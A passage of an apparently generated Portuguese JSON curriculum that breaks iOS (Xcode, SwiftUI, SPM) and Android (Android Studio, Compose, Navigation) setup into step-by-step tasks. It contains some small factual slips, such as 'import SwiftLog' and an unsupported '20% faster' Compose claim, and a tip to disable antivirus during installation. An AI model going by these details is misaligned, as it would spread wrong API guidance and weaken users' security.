                                  "materials": "Mac com macOS Ventura ou superior, Xcode 15+ instalado, Apple Developer Account gratuito (opcional para signing).",
                                  "tips": "Use um Bundle Identifier no formato 'com.seunome.meuapp' para evitar conflitos futuros.",
                                  "learningObjective": "Entender o processo de inicialização de um projeto iOS nativo no Xcode.",
                                  "commonMistakes": "Selecionar template errado (ex: macOS em vez de iOS); ignorar signing team, causando erros de build."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Configurar Interface Inicial com SwiftUI ou Storyboard",
                                  "subSteps": [
                                    "Se SwiftUI: Abra ContentView.swift e adicione um Text('Hello, World!') em uma VStack.",
                                    "Se Storyboard: Abra Main.storyboard, arraste um View Controller da Library, defina como Initial View Controller.",
                                    "Adicione um UILabel ao View Controller com texto 'Hello, World!' e configure constraints básicas (centerX, centerY).",
                                    "Conecte o UILabel a uma IBOutlet no ViewController.swift se usando Storyboard.",
                                    "Atualize Info.plist se necessário para suportar orientações."
                                  ],
                                  "verification": "Pré-visualize a tela no Canvas (SwiftUI) ou Simulator Identity (Storyboard) mostrando 'Hello, World!' centralizado.",
                                  "estimatedTime": "15-20 minutos",
                                  "materials": "Projeto criado no Step 1, documentação Apple SwiftUI/Storyboard básica.",
                                  "tips": "SwiftUI é mais moderno e declarativo; comece com ele para apps simples.",
                                  "learningObjective": "Dominar configuração básica de UI declarativa ou imperativa no iOS.",
                                  "commonMistakes": "Esquecer de marcar Initial View Controller no Storyboard; não importar UIKit em arquivos SwiftUI."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Implementar ViewController Simples com Lógica Básica",
                                  "subSteps": [
                                    "Crie um botão na UI (Button em SwiftUI ou UIButton em Storyboard).",
                                    "Adicione ação: Em SwiftUI, use .onTapGesture para atualizar @State var; em Storyboard, crie IBAction.",
                                    "Implemente lógica: Botão incrementa um contador exibido na tela.",
                                    "Adicione navegação básica: Crie segunda view e botão para push.",
                                    "Teste interações no preview ou simulator."
                                  ],
                                  "verification": "Clique no botão altera o texto/contador na tela sem crashes.",
                                  "estimatedTime": "20-25 minutos",
                                  "materials": "Projeto dos steps anteriores, SwiftUI docs ou UIKit reference.",
                                  "tips": "Use @State e @Binding em SwiftUI para reatividade; PreviewProvider para testes rápidos.",
                                  "learningObjective": "Construir interatividade básica em ViewControllers iOS.",
                                  "commonMistakes": "Não declarar variáveis como @State em SwiftUI; conectar outlets/actions errados no Storyboard."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Gerenciar Dependências com Swift Package Manager",
                                  "subSteps": [
                                    "Vá em File > Add Package Dependencies, insira URL de um pacote (ex: https://github.com/apple/swift-log).",
                                    "Selecione versão (Up to Next Major), adicione ao target principal.",
                                    "No código, import SwiftLog e crie um Logger simples na View.",
                                    "Configure logger para printar mensagens ao interagir com botão.",
                                    "Build o projeto para verificar resolução de dependências."
                                  ],
                                  "verification": "Projeto compila sem erros de dependência; logs aparecem no console ao rodar.",
                                  "estimatedTime": "10-15 minutos",
                                  "materials": "Acesso à internet, repositórios Swift Packages públicos (ex: swift-log).",
                                  "tips": "Sempre use 'Up to Next Major' para estabilidade; verifique Package.resolved após add.",
                                  "learningObjective": "Integrar e usar bibliotecas externas via SPM sem CocoaPods/Carthage.",
                                  "commonMistakes": "URL inválida ou versão incompatível; esquecer de adicionar ao target correto."
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Build, Run e Debug Inicial",
                                  "subSteps": [
                                    "Selecione simulator iPhone (ex: iPhone 15) no toolbar.",
                                    "Pressione Cmd+R para build e run.",
                                    "Monitore console para erros/logs; use breakpoints se necessário.",
                                    "Teste funcionalidades: UI carrega, botão funciona, dependência loga.",
                                    "Pare o app (Stop button) e faça hot reload se aplicável."
                                  ],
                                  "verification": "App roda no simulator sem crashes, todas features do projeto funcionam.",
                                  "estimatedTime": "10 minutos",
                                  "materials": "Simulator iOS instalado via Xcode Preferences > Platforms.",
                                  "tips": "Cmd+Shift+O para Open Quickly arquivos; use Debug navigator para performance.",
                                  "learningObjective": "Executar ciclo completo de desenvolvimento iOS: edit-build-run-debug.",
                                  "commonMistakes": "Signing errors (adicione Apple ID em Accounts); esquecendo de build antes de run."
                                }
                              ],
                              "practicalExample": "Crie um app 'ContadorLogger' onde um botão incrementa um contador e loga o valor usando swift-log. SwiftUI mostra contador centralizado, botão abaixo; roda no simulator exibindo logs no console.",
                              "finalVerifications": [
                                "Projeto abre e build sem warnings/erros críticos.",
                                "UI renderiza corretamente com 'Hello World' e contador funcional.",
                                "Dependência swift-log instalada e usada (logs visíveis no console).",
                                "App roda fluido no simulator iPhone.",
                                "Nenhuma violação de constraints ou memory leaks iniciais.",
                                "Estrutura de projeto organizada com comentários no código."
                              ],
                              "assessmentCriteria": [
                                "Precisão na criação e configuração do projeto (template correto, Bundle ID único).",
                                "Qualidade da UI: responsiva, constraints adequadas, interatividade fluida.",
                                "Integração correta de SPM: dependência resolve, código usa sem erros.",
                                "Código limpo: Swift moderno, sem código morto, comentários explicativos.",
                                "Testes funcionais: todas ações verificadas em simulator.",
                                "Tempo de execução: completado dentro de 1-1.5 horas."
                              ],
                              "crossCurricularConnections": [
                                "Programação Orientada a Objetos (ViewControllers como classes).",
                                "Design de Interfaces (UX/UI principles em SwiftUI/Storyboard).",
                                "Gestão de Projetos (version control pronto para Git init).",
                                "Matemática Computacional (lógica de estado e binding).",
                                "Segurança de Software (entender signing e entitlements)."
                              ],
                              "realWorldApplication": "Essa habilidade é fundamental para desenvolvedores iOS iniciantes em empresas como startups ou agências, permitindo protótipos rápidos de apps como trackers de hábitos, forms simples ou dashboards, escalando para apps profissionais com autenticação e APIs."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.2.1.2.2"
                            ]
                          },
                          {
                            "id": "10.1.2.1.2.4",
                            "name": "Executar Aplicação em Simulador ou Dispositivo",
                            "description": "Compilar e executar uma aplicação iOS no simulador Xcode ou em um dispositivo iPhone/iPad físico, utilizando o debugger e console para inspeção de runtime.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Preparar o Projeto e Ambiente de Desenvolvimento",
                                  "subSteps": [
                                    "Abra o Xcode e carregue o projeto iOS (.xcodeproj ou .xcworkspace).",
                                    "Verifique se o esquema (scheme) está selecionado corretamente no menu superior (ex: Debug para simulador).",
                                    "Conecte o dispositivo físico via USB se pretendendo testar em hardware real e habilite o Modo Desenvolvedor.",
                                    "Instale certificados de desenvolvedor via Xcode > Preferences > Accounts.",
                                    "Limpe builds anteriores selecionando Product > Clean Build Folder."
                                  ],
                                  "verification": "Projeto abre sem erros, esquema selecionado e build limpo executado com sucesso.",
                                  "estimatedTime": "10 minutos",
                                  "materials": "Mac com Xcode instalado (versão 15+), projeto iOS SwiftUI ou UIKit, cabo USB para dispositivo (opcional).",
                                  "tips": "Use Command+Shift+K para limpar build rapidamente.",
                                  "learningObjective": "Configurar corretamente o ambiente Xcode para builds confiáveis.",
                                  "commonMistakes": "Esquecer de selecionar o target correto ou não limpar builds antigos causando caches inválidos."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Compilar a Aplicação",
                                  "subSteps": [
                                    "Selecione o destino: simulador (ex: iPhone 15 Simulator) ou dispositivo físico no menu de dispositivos.",
                                    "Pressione Command+B ou vá em Product > Build para compilar.",
                                    "Monitore a barra de status e Issue Navigator para erros de compilação.",
                                    "Corrija erros identificados no código ou configurações (ex: imports faltantes).",
                                    "Repita o build até sucesso (barra superior mostra 'Build Succeeded')."
                                  ],
                                  "verification": "Mensagem 'Build Succeeded' aparece e não há erros no Issue Navigator.",
                                  "estimatedTime": "5-15 minutos",
                                  "materials": "Projeto iOS funcional, Apple Developer Account (para dispositivo).",
                                  "tips": "Ative 'Pause on Launch' no breakpoint navigator para debug imediato.",
                                  "learningObjective": "Entender o processo de compilação e resolução de erros de build.",
                                  "commonMistakes": "Selecionar arquitetura errada (ARM para simulador x86) ou esquecendo signing para dispositivo."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Executar a Aplicação no Simulador",
                                  "subSteps": [
                                    "Pressione Command+R ou Product > Run para executar.",
                                    "Aguarde o simulador abrir e a app instalar/launch.",
                                    "Interaja com a app no simulador (toque, gestos).",
                                    "Acesse o Console do simulador via Window > Devices and Simulators.",
                                    "Pare a execução com o botão Stop no Xcode ou Command+."
                                  ],
                                  "verification": "App lança no simulador, responde a interações e para corretamente.",
                                  "estimatedTime": "5 minutos",
                                  "materials": "Simulador iOS configurado no Xcode.",
                                  "tips": "Use Command+S para salvar e Command+R para rerun rápido.",
                                  "learningObjective": "Executar e testar apps em ambiente simulado sem hardware físico.",
                                  "commonMistakes": "Não esperar o simulador bootar completamente ou ignorar warnings no console."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Executar em Dispositivo Físico e Inspecionar com Debugger/Console",
                                  "subSteps": [
                                    "Selecione o dispositivo físico no menu de dispositivos.",
                                    "Execute Command+R; aguarde instalação e trust no dispositivo.",
                                    "Defina breakpoints no código (clique na margem esquerda).",
                                    "Use o debugger: Step Over (F6), Step Into (F7), inspect variáveis no Variables View.",
                                    "Monitore logs no Console do Xcode (View > Debug Area > Activate Console)."
                                  ],
                                  "verification": "App roda no dispositivo, breakpoints param execução e logs/variáveis são visíveis.",
                                  "estimatedTime": "10-20 minutos",
                                  "materials": "iPhone/iPad com iOS compatível, conta Apple Developer gratuita/paga.",
                                  "tips": "Para logs: print() ou os_log() no código para output claro.",
                                  "learningObjective": "Debugar runtime em hardware real usando ferramentas Xcode.",
                                  "commonMistakes": "Não confiar o dispositivo nas Configurações iOS ou usar cabo USB defeituoso."
                                }
                              ],
                              "practicalExample": "Crie uma app SwiftUI simples de contador de cliques. Compile e rode no simulador iPhone 15: interaja para incrementar contador. Em iPhone físico, defina breakpoint no botão action, step through e verifique valor do contador no debugger; confira logs de cliques no console.",
                              "finalVerifications": [
                                "App compila sem erros em simulador e dispositivo.",
                                "Execução no simulador responde a interações sem crashes.",
                                "App instala e roda em dispositivo físico com trust correto.",
                                "Breakpoints ativam e variáveis são inspecionadas corretamente.",
                                "Console exibe logs de runtime sem warnings críticos.",
                                "Execução para limpa sem leaks de memória visíveis."
                              ],
                              "assessmentCriteria": [
                                "Tempo de build < 30s e sem erros recorrentes.",
                                "Uso correto de debugger (step over/into, variáveis view).",
                                "Identificação e correção de 2+ issues via console.",
                                "Execução fluida em ambos ambientes (simulador/dispositivo).",
                                "Explicação clara de logs e breakpoints em relatório.",
                                "Aplicação de tips para otimizar workflow."
                              ],
                              "crossCurricularConnections": [
                                "Programação Geral: Conceitos de debugging universais (breakpoints, logging).",
                                "Sistemas Operacionais: Entendimento de iOS sandbox e permissões.",
                                "Qualidade de Software: Testes unitários e inspeção runtime.",
                                "Gestão de Projetos: Integração CI/CD com Xcode builds."
                              ],
                              "realWorldApplication": "Desenvolvedores iOS usam isso diariamente para testar apps como Uber ou Instagram em simuladores para UI/UX rápida e dispositivos para performance real (GPS, câmera), debugando crashes reportados por usuários via console e Instruments."
                            },
                            "estimatedTime": "0.5 horas",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.2.1.2.3"
                            ]
                          }
                        ]
                      }
                    ]
                  },
                  {
                    "id": "10.1.2.2",
                    "name": "Linguagens e Frameworks Nativos",
                    "description": "Uso de Kotlin/Java para Android e Swift para iOS no desenvolvimento nativo de aplicativos.",
                    "individualConcepts": [
                      {
                        "id": "10.1.2.2.1",
                        "name": "Desenvolvimento Nativo para Android com Kotlin e Java",
                        "description": "Aborda o uso das linguagens Kotlin e Java no desenvolvimento de aplicativos nativos para Android, utilizando o Android Studio como IDE principal, com ênfase em arquitetura MVVM, componentes de UI e integração com serviços do sistema.",
                        "specificSkills": [
                          {
                            "id": "10.1.2.2.1.1",
                            "name": "Configuração do Ambiente Android Studio",
                            "description": "Instalação do Android Studio, configuração do SDK, criação de AVD (Android Virtual Device) e geração de um projeto básico com Activity principal em Kotlin ou Java.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Download e Instalação do Android Studio",
                                  "subSteps": [
                                    "Acesse o site oficial do Android Studio (developer.android.com/studio).",
                                    "Selecione a versão compatível com seu sistema operacional (Windows, macOS ou Linux).",
                                    "Baixe o instalador e execute-o com privilégios de administrador.",
                                    "Siga o assistente de instalação, aceitando os termos e selecionando componentes padrão.",
                                    "Reinicie o computador após a instalação para garantir que todas as dependências sejam carregadas."
                                  ],
                                  "verification": "Verifique se o Android Studio aparece no menu de aplicativos e abre sem erros ao iniciá-lo pela primeira vez.",
                                  "estimatedTime": "20-30 minutos",
                                  "materials": [
                                    "Computador com pelo menos 8GB RAM, 4GB espaço livre em disco",
                                    "Conexão à internet estável",
                                    "Sistema operacional atualizado (Windows 10+, macOS 10.14+, Ubuntu 20.04+)"
                                  ],
                                  "tips": "Desative antivírus temporariamente se houver bloqueios durante a instalação; use a versão mais recente para evitar bugs conhecidos.",
                                  "learningObjective": "Instalar corretamente o IDE Android Studio em diferentes sistemas operacionais.",
                                  "commonMistakes": [
                                    "Baixar de fontes não oficiais (risco de malware)",
                                    "Ignorar requisitos mínimos de hardware",
                                    "Não reiniciar após instalação"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Configuração Inicial e Instalação do SDK",
                                  "subSteps": [
                                    "Abra o Android Studio e complete o setup wizard na primeira execução.",
                                    "No SDK Manager (Tools > SDK Manager), selecione a API level mais recente (ex: Android 14, API 34).",
                                    "Instale o Android SDK Command-line Tools e o SDK Platform-Tools.",
                                    "Configure o caminho do JDK (use o Embedded JDK ou baixe OpenJDK 17+).",
                                    "Aplique as mudanças e aguarde o download e instalação dos componentes."
                                  ],
                                  "verification": "Confira em File > Project Structure > SDK Location se o Android SDK path está corretamente definido e sem erros vermelhos.",
                                  "estimatedTime": "15-25 minutos",
                                  "materials": [
                                    "Android Studio aberto",
                                    "Conexão à internet para downloads",
                                    "JDK 17 ou superior instalado (se não usar o embutido)"
                                  ],
                                  "tips": "Marque 'Show Package Details' no SDK Manager para instalar apenas o essencial e economizar espaço.",
                                  "learningObjective": "Configurar o Android SDK e dependências necessárias para desenvolvimento nativo.",
                                  "commonMistakes": [
                                    "Selecionar API levels desatualizadas",
                                    "Não configurar o JDK corretamente (leva a erros de compilação)",
                                    "Ignorar o download de platform-tools"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Criação de um Android Virtual Device (AVD)",
                                  "subSteps": [
                                    "Acesse Tools > AVD Manager.",
                                    "Clique em 'Create Virtual Device' e selecione um dispositivo hardware (ex: Pixel 6).",
                                    "Escolha uma system image compatível (ex: API 34, com Google Play se necessário).",
                                    "Configure o AVD: defina nome, RAM (mínimo 2GB), resolução e habilite aceleração de hardware.",
                                    "Finalize clicando em 'Finish' e inicie o emulador para testar."
                                  ],
                                  "verification": "O AVD inicia corretamente no emulador sem crashes e exibe a tela inicial do Android.",
                                  "estimatedTime": "10-20 minutos",
                                  "materials": [
                                    "Android Studio com SDK instalado",
                                    "Hardware com suporte a virtualização (HAXM para Intel ou Hypervisor para AMD)"
                                  ],
                                  "tips": "Ative a virtualização no BIOS/UEFI do computador para melhor performance do emulador.",
                                  "learningObjective": "Criar e configurar um emulador Android funcional para testes sem dispositivo físico.",
                                  "commonMistakes": [
                                    "Não habilitar aceleração de hardware (emulador lento)",
                                    "Selecionar system image sem ABI x86_64",
                                    "Nomear AVD com caracteres especiais"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Criação e Teste de um Projeto Básico com Activity Principal",
                                  "subSteps": [
                                    "Selecione File > New > New Project e escolha 'Empty Activity'.",
                                    "Defina nome do projeto, pacote (ex: com.exemplo.basico), linguagem Kotlin e minimum SDK API 24.",
                                    "No wizard, confirme AVD como target e clique em 'Finish'.",
                                    "Aguarde o Gradle sync e build inicial.",
                                    "Clique no botão Run (seta verde) para compilar e executar no AVD criado."
                                  ],
                                  "verification": "O app roda no emulador exibindo 'Hello World' na Activity principal sem erros no Logcat.",
                                  "estimatedTime": "15-25 minutos",
                                  "materials": [
                                    "AVD configurado",
                                    "Projeto vazio criado no Android Studio"
                                  ],
                                  "tips": "Use Kotlin como linguagem padrão para alinhar com práticas modernas do Google.",
                                  "learningObjective": "Gerar um projeto Android funcional e executá-lo no emulador.",
                                  "commonMistakes": [
                                    "Não aguardar Gradle sync completo",
                                    "Escolher minimum SDK muito alto (limita testes)",
                                    "Ignorar erros no Logcat durante o run"
                                  ]
                                }
                              ],
                              "practicalExample": "Configure o ambiente para criar um app simples de 'Calculadora Básica': instale Android Studio, SDK API 34, AVD Pixel 6, crie projeto Kotlin Empty Activity e rode para ver a tela inicial pronta para adicionar botões de cálculo.",
                              "finalVerifications": [
                                "Android Studio inicia sem erros e SDK Manager mostra todos pacotes instalados.",
                                "AVD roda suavemente com pelo menos 30 FPS.",
                                "Projeto básico compila em menos de 2 minutos e exibe Activity sem crashes.",
                                "Logcat não apresenta erros críticos (warnings ok).",
                                "MainActivity.kt ou .java contém código boilerplate padrão.",
                                "Gradle build bem-sucedido com 'BUILD SUCCESSFUL' no terminal."
                              ],
                              "assessmentCriteria": [
                                "Todos os steps completados com verificações positivas (100% funcionalidade).",
                                "Tempo total de setup abaixo de 90 minutos.",
                                "Ambiente configurado permite criar e rodar múltiplos projetos sem reconfiguração.",
                                "Uso correto de Kotlin como linguagem principal.",
                                "Documentação de erros encontrados e soluções aplicadas.",
                                "AVD otimizado para performance (aceleração habilitada)."
                              ],
                              "crossCurricularConnections": [
                                "Programação Geral: Conceitos de IDEs e gerenciamento de dependências (Gradle como Maven/Ant).",
                                "Sistemas Operacionais: Instalação de software e configuração de ambientes virtuais.",
                                "Redes e Internet: Downloads seguros e gerenciamento de APIs.",
                                "Desenvolvimento Web: Paralelos com setup de Node.js/React Native para apps híbridos."
                              ],
                              "realWorldApplication": "Todo desenvolvedor Android profissional inicia projetos assim; essencial para freelances criarem apps para clientes, startups prototiparem MVPs ou empresas integrarem apps nativos em ecossistemas mobile."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.2.2.1.2",
                            "name": "Criação de Interfaces de Usuário com XML e Jetpack Compose",
                            "description": "Desenvolvimento de layouts XML com ConstraintLayout, RecyclerView e Material Design; introdução ao Jetpack Compose para UIs declarativas em Kotlin.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Criar Layouts Básicos com XML e ConstraintLayout",
                                  "subSteps": [
                                    "Instale o Android Studio e crie um novo projeto com Empty Activity.",
                                    "Abra o arquivo res/layout/activity_main.xml e adicione elementos como TextView, Button e ImageView.",
                                    "Use ConstraintLayout como root e configure constraints (app:layout_constraintTop_toTopOf, etc.) para posicionar views responsivamente.",
                                    "Teste o layout em diferentes tamanhos de tela usando o Layout Inspector.",
                                    "Adicione padding e margins para melhorar o espaçamento."
                                  ],
                                  "verification": "O layout renderiza corretamente em emuladores de diferentes densidades sem sobreposições ou quebras.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Android Studio",
                                    "Emulador Android",
                                    "Documentação ConstraintLayout (developer.android.com)"
                                  ],
                                  "tips": "Sempre use chains e guidelines para layouts responsivos; evite LinearLayout para complexidade.",
                                  "learningObjective": "Dominar posicionamento relativo e responsivo de views usando constraints.",
                                  "commonMistakes": [
                                    "Esquecer de definir ID para views referenciadas",
                                    "Usar dimensões fixas em vez de percentuais",
                                    "Não testar em múltiplos dispositivos"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Implementar RecyclerView com Adapter e Material Design",
                                  "subSteps": [
                                    "Adicione RecyclerView ao layout XML e configure LinearLayoutManager no código Kotlin.",
                                    "Crie um item layout XML para cada célula da lista com CardView e Material components (TextView, ImageView).",
                                    "Implemente um Adapter personalizado com ViewHolder, bind e onCreateViewHolder.",
                                    "Popule dados de uma lista mock e aplique RecyclerView no Activity/Fragment.",
                                    "Estilize com Material Design 3 themes e componentes como MaterialButton."
                                  ],
                                  "verification": "A lista rola suavemente, itens são reciclados corretamente e cliques funcionam sem lags.",
                                  "estimatedTime": "3 horas",
                                  "materials": [
                                    "Dependências: implementation 'androidx.recyclerview:recyclerview:1.3.2'",
                                    "implementation 'com.google.android.material:material:1.11.0'",
                                    "Exemplos de Adapter no GitHub"
                                  ],
                                  "tips": "Use DiffUtil para atualizações eficientes; prefira Paging 3 para listas grandes.",
                                  "learningObjective": "Construir listas dinâmicas eficientes com reciclagem de views e design moderno.",
                                  "commonMistakes": [
                                    "Não chamar notifyDataSetChanged() corretamente",
                                    "Límites de memória por carregar imagens sem Glide/Picasso",
                                    "Ignorar touch feedback em itens"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Introdução ao Jetpack Compose: Composable Básicos",
                                  "subSteps": [
                                    "Adicione dependências Compose no build.gradle (kotlinCompilerExtensionVersion, composeBom).",
                                    "Substitua setContent no Activity por setContent { MyAppTheme { Surface { Greeting() } } }.",
                                    "Crie composables como @Composable fun ButtonExample() com Text, Button e Column/Row.",
                                    "Use modifiers para padding, size e alignment (Modifier.padding(16.dp), fillMaxSize()).",
                                    "Implemente estado com remember e mutableStateOf para interatividade."
                                  ],
                                  "verification": "A UI Compose renderiza e responde a cliques/mudanças de estado sem erros de recomposição.",
                                  "estimatedTime": "2.5 horas",
                                  "materials": [
                                    "Documentação Jetpack Compose (compose.android.com)",
                                    "Emulador com API 34+",
                                    "Samples no Android Studio"
                                  ],
                                  "tips": "Sempre use Preview @Preview para iterações rápidas; evite side-effects em composables.",
                                  "learningObjective": "Entender programação declarativa e recomposição inteligente em Compose.",
                                  "commonMistakes": [
                                    "Não usar remember para estado",
                                    "Colocar lógica de negócios em composables",
                                    "Ignorar MaterialTheme para consistência"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Criar UI Declarativa Avançada com Jetpack Compose",
                                  "subSteps": [
                                    "Construa uma lista com LazyColumn equivalente ao RecyclerView, usando itens e itemContent.",
                                    "Integre imagens com AsyncImage e navegação com NavHost/Composable destinations.",
                                    "Aplique temas Material 3 com colorScheme e typography personalizados.",
                                    "Adicione animações com AnimatedVisibility e modifier.animateContentSize().",
                                    "Compare performance com XML rodando lado a lado no mesmo app."
                                  ],
                                  "verification": "A tela Compose replica funcionalidade XML com melhor performance e responsividade.",
                                  "estimatedTime": "3 horas",
                                  "materials": [
                                    "implementation 'androidx.compose.material3:material3'",
                                    "implementation 'io.coil-kt:coil-compose:2.5.0'",
                                    "Jetpack Navigation Compose"
                                  ],
                                  "tips": "Use Lazy layouts para performance; teste com Compose Metrics para otimizar recomposições.",
                                  "learningObjective": "Migrar e aprimorar UIs de XML para Compose com componentes avançados.",
                                  "commonMistakes": [
                                    "Usar Column para listas longas",
                                    "Não lazy-load imagens",
                                    "Esquecer de fornecer ViewModel para estado"
                                  ]
                                }
                              ],
                              "practicalExample": "Desenvolva uma tela de lista de produtos em um app de e-commerce: use XML com RecyclerView e ConstraintLayout para exibir itens com imagem, título e preço; migre para Jetpack Compose com LazyColumn, AsyncImage e MaterialCard, adicionando animações em cliques para detalhes.",
                              "finalVerifications": [
                                "Layouts XML responsivos em múltiplos dispositivos sem quebras.",
                                "RecyclerView eficiente com >100 itens sem lags ou memory leaks.",
                                "Composable UI interativa com estado gerenciado e recomposições otimizadas.",
                                "Aplicação consistente de Material Design 3 em ambos os paradigmas.",
                                "Migração bem-sucedida de XML para Compose mantendo funcionalidade.",
                                "Performance medida: Compose 20% mais rápido em benchmarks."
                              ],
                              "assessmentCriteria": [
                                "Precisão e responsividade dos layouts (80% cobertura de telas).",
                                "Eficiência de listas (sem GC spikes em perfis).",
                                "Qualidade de código: Clean architecture, reusabilidade de composables.",
                                "Aderência a Material Design guidelines (cores, tipografia, espaçamento).",
                                "Capacidade de debug: Uso de Layout Inspector e Compose Metrics.",
                                "Documentação inline e comentários em código Kotlin."
                              ],
                              "crossCurricularConnections": [
                                "Design Gráfico: Princípios de UX/UI e Material Design.",
                                "Programação Web: Similaridades com React (declarativo) vs. HTML imperativo.",
                                "Banco de Dados: Integração com Room para dados em RecyclerView/LazyColumn.",
                                "Testes de Software: Unit tests para Adapters e Composables com Compose Test.",
                                "Gestão de Projetos: Versionamento com Git para migrações XML->Compose."
                              ],
                              "realWorldApplication": "Desenvolvimento de apps Android profissionais como e-commerces (ex: Mercado Livre), redes sociais (Instagram-like feeds) ou ferramentas empresariais, onde UIs fluidas e responsivas impulsionam retenção de usuários e vendas."
                            },
                            "estimatedTime": "4 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.2.2.1.3",
                            "name": "Implementação de Lógica em Activities e Fragments com Kotlin",
                            "description": "Criação de Activities, Fragments e navegação com Navigation Component; gerenciamento de ciclo de vida e passagem de dados entre componentes em Kotlin.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configurar Projeto Android com Activities e Fragments",
                                  "subSteps": [
                                    "Criar um novo projeto no Android Studio usando o template Empty Activity com Kotlin.",
                                    "Adicionar dependências do Navigation Component no build.gradle (Module: app): implementation 'androidx.navigation:navigation-fragment-ktx:2.7.6' e implementation 'androidx.navigation:navigation-ui-ktx:2.7.6'.",
                                    "Criar um diretório res/navigation com nav_graph.xml para definir o Navigation Graph.",
                                    "Configurar o NavHostFragment no layout da MainActivity.",
                                    "Gerar um Action para navegação inicial entre fragments."
                                  ],
                                  "verification": "Projeto compila sem erros e o NavHostFragment é exibido na MainActivity ao rodar o app.",
                                  "estimatedTime": "1 hour",
                                  "materials": [
                                    "Android Studio",
                                    "Emulador ou dispositivo físico",
                                    "Documentação oficial do Navigation Component"
                                  ],
                                  "tips": "Sempre sincronize o Gradle após adicionar dependências. Use Safe Args para passagem de dados segura.",
                                  "learningObjective": "Entender a estrutura básica de um app com Navigation Component e preparar o ambiente para Activities e Fragments.",
                                  "commonMistakes": [
                                    "Esquecer de aplicar o plugin de Safe Args",
                                    "Não sincronizar Gradle após mudanças no build.gradle",
                                    "Configurar incorretamente o appBarConfiguration"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Implementar Lógica em Activities",
                                  "subSteps": [
                                    "Criar a MainActivity.kt e estender AppCompatActivity.",
                                    "Implementar onCreate() para configurar o NavController e o NavigationUI.",
                                    "Adicionar lógica de negócios como chamadas de API ou manipulação de dados locais usando ViewModel.",
                                    "Gerenciar o ciclo de vida com onResume(), onPause() para atualizar UI ou pausar operações.",
                                    "Passar dados para Fragments usando Bundle no NavController."
                                  ],
                                  "verification": "Activity responde a eventos de ciclo de vida (log no Logcat) e navega para um Fragment ao clicar em um botão.",
                                  "estimatedTime": "1.5 hours",
                                  "materials": [
                                    "Android Studio",
                                    "Exemplo de ViewModel com LiveData",
                                    "Documentação de AppCompatActivity"
                                  ],
                                  "tips": "Use ViewBinding ou Data Binding para acessar views de forma segura. Evite lógica pesada no onCreate.",
                                  "learningObjective": "Dominar o ciclo de vida da Activity e integração com Navigation Component.",
                                  "commonMistakes": [
                                    "Fazer operações longas na UI thread",
                                    "Não lidar com configurações de orientação",
                                    "Bundle vazios na navegação"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Implementar Lógica em Fragments",
                                  "subSteps": [
                                    "Criar um novo Fragment (ex: ListFragment.kt) estendendo Fragment.",
                                    "Implementar onCreateView() com inflate do layout e configuração de RecyclerView.",
                                    "Gerenciar ciclo de vida com onViewCreated(), onDestroyView() para observers de LiveData.",
                                    "Implementar passagem de dados recebidos via arguments com Safe Args.",
                                    "Adicionar botões para navegação para outros Fragments usando findNavController().navigate()."
                                  ],
                                  "verification": "Fragment carrega dados corretamente, RecyclerView exibe itens e navega sem vazamentos de memória (verificar com Profiler).",
                                  "estimatedTime": "2 hours",
                                  "materials": [
                                    "Android Studio",
                                    "Biblioteca RecyclerView",
                                    "Safe Args Gradle Plugin"
                                  ],
                                  "tips": "Sempre chame super.onDestroyView() e remova observers para evitar memory leaks. Use Fragment Arguments para dados imutáveis.",
                                  "learningObjective": "Implementar lógica fragment-specific com gerenciamento adequado de ciclo de vida e comunicação com Activity.",
                                  "commonMistakes": [
                                    "Não remover observers em onDestroyView()",
                                    "Inflate múltiplas vezes o layout",
                                    "Usar findFragmentById() incorretamente"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Gerenciar Navegação, Ciclo de Vida e Passagem de Dados",
                                  "subSteps": [
                                    "Configurar deep links e ações condicionais no nav_graph.xml.",
                                    "Implementar ViewModel compartilhado entre Activity e Fragments usando activityViewModels().",
                                    "Passar dados complexos com Parcelable ou Serializable via Safe Args.",
                                    "Tratar backstack com popBackStack() e configurações de launchSingleTop.",
                                    "Testar rotação de tela e ciclo de vida completo com logs."
                                  ],
                                  "verification": "App navega corretamente em todas as direções, dados persistem na rotação e não há crashes em back navigation.",
                                  "estimatedTime": "1.5 hours",
                                  "materials": [
                                    "Android Studio Profiler",
                                    "Documentação de ViewModel e Navigation",
                                    "Exemplos de Parcelable"
                                  ],
                                  "tips": "Use by viewModels() para scoped ViewModels. Monitore lifecycle com LifecycleOwner.",
                                  "learningObjective": "Integrar todos os componentes com navegação fluida e dados consistentes.",
                                  "commonMistakes": [
                                    "Não usar singleTop para evitar múltiplas instâncias",
                                    "Passar dados mutáveis sem cópia",
                                    "Ignorar configurações de destino no graph"
                                  ]
                                }
                              ],
